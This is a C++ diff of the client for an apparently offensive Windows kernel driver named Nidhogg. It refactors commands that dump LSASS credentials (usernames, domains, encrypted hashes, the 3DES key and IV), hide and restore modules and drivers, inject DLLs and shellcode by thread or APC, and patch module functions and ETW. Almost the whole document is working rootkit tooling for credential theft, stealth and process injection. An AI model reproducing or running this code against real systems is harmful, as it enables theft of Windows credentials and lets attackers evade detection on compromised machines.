@@ -26,11 +26,10 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 			PrintHelp();
 			return;
 		}
-		std::shared_ptr<DesKeyInformation> desKey = std::make_shared<DesKeyInformation>();
-		std::vector<Credentials> credentials = {}; 
+		IoctlCredentials credentials;
 
 		try {
-			credentials = DumpCredentials(desKey);
+			credentials = DumpCredentials();
 		}
 		catch (const MemoryHandlerException& e) {
 			std::cerr << "Error while dumping credentials: " << e.what() << std::endl;
@@ -39,42 +38,48 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		std::wstring currentUsername = L"";
 		std::wstring currentDomain = L"";
 
-		if (credentials.empty()) {
+		if (credentials.Count == 0) {
 			std::cerr << "There are no credentials to display or an error occurred." << std::endl;
 			return;
 		}
-		std::cout << "3DES Key (size: 0x" << std::hex << desKey->Size << "): ";
+		std::cout << "3DES Key (size: 0x" << std::hex << credentials.DesKey.Size << "): ";
 
-		for (DWORD i = 0; i < desKey->Size; i++)
-			std::cout << static_cast<int>(static_cast<PUCHAR>(desKey->Data)[i]);
+		for (DWORD i = 0; i < credentials.DesKey.Size; i++)
+			std::cout << static_cast<int>(static_cast<PUCHAR>(credentials.DesKey.Data)[i]);
+		std::cout << std::endl;
+		std::cout << "IV (size: 0x" << std::hex << credentials.Iv.Size << "): ";
+
+		for (DWORD i = 0; i < credentials.Iv.Size; i++)
+			std::cout << static_cast<int>(static_cast<PUCHAR>(credentials.Iv.Data)[i]);
 		std::cout << std::endl;
 		std::cout << "Credentials:" << std::endl;
 
-		for (SIZE_T i = 0; i < credentials.size(); i++) {
-			currentUsername = std::wstring(credentials[i].Username.Buffer, credentials[i].Username.Length / sizeof(WCHAR));
-			currentDomain = std::wstring(credentials[i].Domain.Buffer, credentials[i].Domain.Length / sizeof(WCHAR));
+		for (SIZE_T i = 0; i < credentials.Count; i++) {
+			currentUsername = std::wstring(credentials.Creds[i].Username.Buffer, credentials.Creds[i].Username.Length / sizeof(WCHAR));
+			currentDomain = std::wstring(credentials.Creds[i].Domain.Buffer, credentials.Creds[i].Domain.Length / sizeof(WCHAR));
 			std::wcout << L"\nUsername: " << currentUsername << std::endl;
 			std::wcout << L"Domain: " << currentDomain << std::endl;
-			std::cout << "Encrypted Hash: ";
 
-			for (USHORT j = 0; j < credentials[i].EncryptedHash.Length; j++)
-				std::cout << static_cast<int>(reinterpret_cast<PUCHAR>(credentials[i].EncryptedHash.Buffer)[j]);
-			std::cout << std::endl;
+			if (credentials.Creds[i].EncryptedHash.Buffer) {
+				std::cout << "Encrypted Hash: ";
 
-			if (credentials[i].Username.Buffer) {
-				free(credentials[i].Username.Buffer);
-				credentials[i].Username.Buffer = nullptr;
+				for (USHORT j = 0; j < credentials.Creds[i].EncryptedHash.Length; j++)
+					std::cout << static_cast<int>(reinterpret_cast<PUCHAR>(credentials.Creds[i].EncryptedHash.Buffer)[j]);
+				std::cout << std::endl;
 			}
-			if (credentials[i].Domain.Buffer) {
-				free(credentials[i].Domain.Buffer);
-				credentials[i].Domain.Buffer = nullptr;
+
+			if (credentials.Creds[i].Username.Buffer) {
+				SafeFree(credentials.Creds[i].Username.Buffer);
 			}
-			if (credentials[i].EncryptedHash.Buffer) {
-				free(credentials[i].EncryptedHash.Buffer);
-				credentials[i].EncryptedHash.Buffer = nullptr;
+			if (credentials.Creds[i].Domain.Buffer) {
+				SafeFree(credentials.Creds[i].Domain.Buffer);
+			}
+			if (credentials.Creds[i].EncryptedHash.Buffer) {
+				SafeFree(credentials.Creds[i].EncryptedHash.Buffer);
 			}
 		}
-		SafeFree(desKey->Data);
+		SafeFree(credentials.Iv.Data);
+		SafeFree(credentials.DesKey.Data);
 		std::cout << std::dec << std::endl;
 	} else if (commandName.compare("hide_module") == 0) {
 		std::wstring modulePath = L"";
@@ -97,9 +102,30 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 			std::cerr << e.what() << std::endl;
 			return;
 		}
-		HideModule(pid, modulePath) ? std::wcout << L"Module " << modulePath << L"hidden successfully." << std::endl :
+		HideModule(pid, modulePath, true) ? std::wcout << L"Module " << modulePath << L"hidden successfully." << std::endl :
 			std::wcerr << L"Failed to hide module " << modulePath << std::endl;
-	} 
+	}
+	else if (commandName.compare("unhide_module") == 0 || commandName.compare("restore_module") == 0) {
+		std::wstring modulePath = L"";
+		if (params.size() != 3) {
+			PrintHelp();
+			return;
+		}
+		if (!IsValidPid(params.at(1))) {
+			PrintHelp();
+			return;
+		}
+		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
+		try {
+			modulePath = ParsePath<std::string, std::wstring>(params.at(1));
+		}
+		catch (const PathHelperException& e) {
+			std::cerr << e.what() << std::endl;
+			return;
+		}
+		HideModule(pid, modulePath, false) ? std::wcout << L"Module " << modulePath << L" restored successfully." << std::endl :
+			std::wcerr << L"Failed to restore module " << modulePath << std::endl;
+	}
 	else if (commandName.compare("hide_driver") == 0) {
 		std::wstring driverPath = L"";
 
@@ -149,9 +175,9 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		std::string dllPath = params.at(3);
 
 		if (params.at(1).compare("thread") == 0)
-			injectionType = NtCreateThreadExInjection;
+			injectionType = InjectionType::NtCreateThreadExInjection;
 		else if (params.at(1).compare("apc") == 0)
-			injectionType = APCInjection;
+			injectionType = InjectionType::APCInjection;
 		else {
 			std::cerr << "Invalid injection type." << std::endl;
 			PrintHelp();
@@ -201,9 +227,9 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		}
 		
 		if (params.at(1).compare("thread") == 0)
-			injectionType = NtCreateThreadExInjection;
+			injectionType = InjectionType::NtCreateThreadExInjection;
 		else if (params.at(1).compare("apc") == 0)
-			injectionType = APCInjection;
+			injectionType = InjectionType::APCInjection;
 		else {
 			std::cerr << "Invalid injection type." << std::endl;
 			PrintHelp();
@@ -317,17 +343,15 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
  * DumpCredentials is responsible for dumping credentials from LSASS.
  *
  * Parameters:
- * @desKey [_Inout_ std::shared_ptr<DesKeyInformation>] -- The DES key information to be filled.
+ * There are no parameters.
  *
  * Returns:
  * @std::vector<Credentials> -- A vector containing the dumped credentials.
  */
-std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<DesKeyInformation> desKey) {
-	OutputCredentials currentOutputCreds{};
-	Credentials currentCreds{};
-	std::vector<Credentials> credentials;
+IoctlCredentials MemoryHandler::DumpCredentials() {
+	IoctlCredentials credentials{};
 	DWORD returned = 0;
-	DWORD credSize = 0;
+	SIZE_T credSize = 0;
 	DWORD index = 0;
 	bool error = false;
 
@@ -341,99 +365,37 @@ std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<
 		throw MemoryHandlerException("No credentials found or an error occurred while getting credentials size.");
 
 	// Get 3DES key.
-	desKey->Size = 0;
-	desKey->Data = nullptr;
-
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-		nullptr, 0, desKey.get(), sizeof(DesKeyInformation), &returned, nullptr)) {
-		throw MemoryHandlerException("Failed to get DES key size from driver.");
-	}
-
-	if (desKey->Size == 0) {
-		throw MemoryHandlerException("Failed to get DES key size from driver.");
-	}
-
 	try {
-		desKey->Data = SafeAlloc<PVOID>(desKey->Size);
+		credentials.DesKey.Data = SafeAlloc<PVOID>(credentials.DesKey.Size);
 	}
 	catch (const SafeMemoryException& e) {
 		throw MemoryHandlerException(e.what());
 	}
 
+	try {
+		credentials.Iv.Data = SafeAlloc<PVOID>(credentials.Iv.Size);
+	}
+	catch (const SafeMemoryException& e) {
+		SafeFree(credentials.DesKey.Data);
+		throw MemoryHandlerException(e.what());
+	}
+
+	try {
+		credentials.Creds = SafeAlloc<Credentials*>(credSize * sizeof(Credentials));
+	}
+	catch (const SafeMemoryException& e) {
+		SafeFree(credentials.DesKey.Data);
+		SafeFree(credentials.Iv.Data);
+		throw MemoryHandlerException(e.what());
+	}
+
 	if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-		desKey.get(), sizeof(DesKeyInformation), desKey.get(), sizeof(DesKeyInformation), &returned, nullptr)) {
-		SafeFree(desKey->Data);
+		&credentials, sizeof(IoctlCredentials), &credentials, sizeof(IoctlCredentials), &returned, nullptr)) {
+		SafeFree(credentials.Creds);
+		SafeFree(credentials.Iv.Data);
+		SafeFree(credentials.DesKey.Data);
 		throw MemoryHandlerException("Failed to get DES key data from driver.");
 	}
-
-	// Get credentials.
-	for (index = 0; index < credSize; index++) {
-		currentOutputCreds.Index = index;
-		currentOutputCreds.Creds.Username.Buffer = NULL;
-		currentOutputCreds.Creds.Username.Length = 0;
-		currentOutputCreds.Creds.Domain.Buffer = NULL;
-		currentOutputCreds.Creds.Domain.Length = 0;
-		currentOutputCreds.Creds.EncryptedHash.Buffer = NULL;
-		currentOutputCreds.Creds.EncryptedHash.Length = 0;
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
-			&returned, nullptr)) {
-			error = true;
-			break;
-		}
-
-		currentOutputCreds.Creds.Username.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Username.Length);
-
-		if (!currentOutputCreds.Creds.Username.Buffer) {
-			error = true;
-			break;
-		}
-
-		currentOutputCreds.Creds.Domain.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Domain.Length);
-
-		if (!currentOutputCreds.Creds.Domain.Buffer) {
-			error = true;
-			SafeFree(currentOutputCreds.Creds.Username.Buffer);
-			break;
-		}
-
-		currentOutputCreds.Creds.EncryptedHash.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.EncryptedHash.Length);
-
-		if (!currentOutputCreds.Creds.EncryptedHash.Buffer) {
-			error = true;
-			SafeFree(currentOutputCreds.Creds.Username.Buffer);
-			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
-			break;
-		}
-
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
-			&returned, nullptr)) {
-
-			error = true;
-			SafeFree(currentOutputCreds.Creds.Username.Buffer);
-			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
-			SafeFree(currentOutputCreds.Creds.EncryptedHash.Buffer);
-			break;
-		}
-
-		currentCreds.Username = currentOutputCreds.Creds.Username;
-		currentCreds.Domain = currentOutputCreds.Creds.Domain;
-		currentCreds.EncryptedHash = currentOutputCreds.Creds.EncryptedHash;
-		credentials.push_back(currentCreds);
-	}
-
-	if (error) {
-		for (DWORD i = 0; i < credentials.size(); i++) {
-			SafeFree(currentOutputCreds.Creds.Username.Buffer);
-			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
-			SafeFree(currentOutputCreds.Creds.EncryptedHash.Buffer);
-		}
-		SafeFree(desKey->Data);
-		throw MemoryHandlerException("Failed to dump credentials from driver.");
-	}
-
 	return credentials;
 }
 
@@ -451,7 +413,7 @@ std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<
 bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
 	DWORD returned = 0;
 	std::wstring parsedDriverName = L"";
-	HiddenDriverInformation driverInfo{};
+	IoctlHiddenDriverInfo driverInfo{};
 
 	if (!IsValidPath(driverPath))
 		return false;
@@ -470,25 +432,28 @@ bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
 
 /*
  * Description:
- * HideModule is responsible for hiding a module inside a process.
+ * HideModule is responsible for hiding and restoring a module inside a process.
  *
  * Parameters:
- * @pid [_In_ DWORD] -- The PID of the process.
+ * @pid [_In_ DWORD]			   -- The PID of the process.
  * @modulePath [_In_ std::wstring] -- The path of the module to be hidden.
+ * @hide [_In_ bool]			   -- Whether to hide or restore the module.
  *
  * Returns:
- * @bool -- Whether the operation was successful or not.
+ * @bool						   -- Whether the operation was successful or not.
  */
-bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath) {
+bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath, _In_ bool hide) {
+	IoctlHiddenModuleInfo moduleInfo{};
+	DWORD returned = 0;
+
 	if (pid <= SYSTEM_PID || !IsValidPath(modulePath)) {
 		std::cerr << "Invalid PID or module path." << std::endl;
 		return false;
 	}
-	HiddenModuleInformation moduleInfo{};
 	moduleInfo.Pid = pid;
 	moduleInfo.ModuleName = modulePath.data();
-	DWORD returned = 0;
-	return DeviceIoControl(hNidhogg.get(), IOCTL_HIDE_MODULE, &moduleInfo, sizeof(moduleInfo), nullptr, 0, &returned, nullptr);
+	moduleInfo.Hide = hide;
+	return DeviceIoControl(hNidhogg.get(), IOCTL_HIDE_RESTORE_MODULE, &moduleInfo, sizeof(moduleInfo), nullptr, 0, &returned, nullptr);
 }
 
 /*
@@ -504,11 +469,12 @@ bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath) {
  * @bool -- Whether the injection was successful or not.
  */
 bool MemoryHandler::InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType) {
+	IoctlDllInfo dllInformation{};
+
 	if (pid <= SYSTEM_PID || !IsValidPath(dllPath)) {
 		std::cerr << "Invalid PID or DLL path." << std::endl;
 		return false;
 	}
-	DllInformation dllInformation{};
 	dllInformation.Type = injectionType;
 	dllInformation.Pid = pid;
 	errno_t err = strcpy_s(dllInformation.DllPath, dllPath.c_str());
@@ -535,6 +501,7 @@ bool MemoryHandler::InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ Inj
  * @bool -- Whether the injection was successful or not.
  */
 bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shellcode, std::vector<std::string> parameters, _In_ InjectionType injectionType) {
+	IoctlShellcodeInfo shellcodeInfo{};
 	DWORD returned = 0;
 
 	if (pid <= SYSTEM_PID || shellcode.empty()) {
@@ -545,22 +512,21 @@ bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shell
 		std::cerr << "Too many parameters for shellcode injection." << std::endl;
 		return false;
 	}
-	ShellcodeInformation shellcodeInfo{};
 	shellcodeInfo.Pid = pid;
 	shellcodeInfo.Type = injectionType;
 	shellcodeInfo.ShellcodeSize = shellcode.size();
 	shellcodeInfo.Shellcode = shellcode.data();
 
 	if (parameters.size() > 0) {
-		shellcodeInfo.Parameter1 = static_cast<char*>(parameters[0].data());
+		shellcodeInfo.Parameter1 = const_cast<char*>(parameters[0].data());
 		shellcodeInfo.Parameter1Size = parameters[0].size();
 
 		if (parameters.size() > 1) {
-			shellcodeInfo.Parameter2 = static_cast<char*>(parameters[1].data());
+			shellcodeInfo.Parameter2 = const_cast<char*>(parameters[1].data());
 			shellcodeInfo.Parameter2Size = parameters[1].size();
 
 			if (parameters.size() > 2) {
-				shellcodeInfo.Parameter3 = static_cast<char*>(parameters[2].data());
+				shellcodeInfo.Parameter3 = const_cast<char*>(parameters[2].data());
 				shellcodeInfo.Parameter3Size = parameters[2].size();
 			}
 		}
@@ -583,7 +549,7 @@ bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shell
  */
 bool MemoryHandler::PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _In_ std::string functionName, _In_ std::vector<byte> patch) {
 	DWORD returned;
-	PatchedModule patchedModule{};
+	IoctlPatchedModule patchedModule{};
 
 	if (pid <= SYSTEM_PID || !IsValidPath(moduleName) || functionName.size() == 0 || patch.size() == 0)
 		return false;
@@ -636,7 +602,7 @@ bool MemoryHandler::PatchEtw(_In_ DWORD pid) {
  * @bool -- Whether the execution was successful or not.
  */
 bool MemoryHandler::ExecuteScript(_In_ std::vector<byte> script) {
-	DWORD bytesReturned = 0;
+	/*DWORD bytesReturned = 0;
 	ScriptInformation scriptInfo{};
 
 	if (script.size() == 0)
@@ -644,5 +610,7 @@ bool MemoryHandler::ExecuteScript(_In_ std::vector<byte> script) {
 
 	scriptInfo.Script = script.data();
 	scriptInfo.ScriptSize = script.size();
-	return DeviceIoControl(hNidhogg.get(), IOCTL_EXEC_SCRIPT, &scriptInfo, sizeof(scriptInfo), nullptr, 0, &bytesReturned, nullptr);
+	return DeviceIoControl(hNidhogg.get(), IOCTL_EXEC_SCRIPT, &scriptInfo, sizeof(scriptInfo), nullptr, 0, &bytesReturned, nullptr);*/
+	// GOING TO BE DEPRECATED
+	return false;
 }
